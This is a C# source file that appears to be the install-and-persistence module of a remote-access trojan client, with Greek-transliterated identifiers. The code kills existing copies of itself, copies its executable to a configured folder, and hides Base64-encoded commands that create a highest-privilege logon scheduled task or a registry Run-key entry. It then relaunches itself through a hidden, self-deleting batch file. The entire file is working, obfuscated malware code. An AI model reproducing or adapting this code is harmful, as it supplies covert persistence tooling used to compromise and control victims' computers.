using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Peg.ICARUS
{
    internal class Ekinhsh
    {
        public static void egkatasthsh()
        {
            try
            {
                var installPath =
                    new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.Install_Folder),
                        Settings.Install_File));
                var currentProcess = Process.GetCurrentProcess().MainModule.FileName;
                if (currentProcess != installPath.FullName)
                {
                    foreach (var P in Process.GetProcesses())
                        try
                        {
                            if (P.MainModule.FileName == installPath.FullName)
                                P.Kill();
                        }
                        catch
                        {
                        }

                    if (Me8odos.IsAdmin())
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "cmd",
                            Arguments =
                                Encoding.Default.GetString(Convert.FromBase64String(
                                    "L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g")) + "\"" +
                                Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" +
                                installPath.FullName + "\"" + "' & exit",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        });
                    else
                        using (var key = Registry.CurrentUser.OpenSubKey(
                                   Encoding.Default.GetString(Convert.FromBase64String(
                                       "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")),
                                   RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name),
                                "\"" + installPath.FullName + "\"");
                        }

                    FileStream fs;
                    if (File.Exists(installPath.FullName))
                    {
                        File.Delete(installPath.FullName);
                        Thread.Sleep(1000);
                    }

                    fs = new FileStream(installPath.FullName, FileMode.CreateNew);
                    var clientExe = File.ReadAllBytes(currentProcess);
                    fs.Write(clientExe, 0, clientExe.Length);

                    Me8odos.ClientOnExit();

                    var batch = Path.GetTempFileName() + ".bat";
                    using (var sw = new StreamWriter(batch))
                    {
                        sw.WriteLine("@echo off");
                        sw.WriteLine("timeout 3 > NUL");
                        sw.WriteLine("START " + "\"" + "\" " + "\"" + installPath.FullName + "\"");
                        sw.WriteLine("CD " + Path.GetTempPath());
                        sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                    }

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = batch,
                        CreateNoWindow = true,
                        ErrorDialog = false,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    });

                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }
    }
}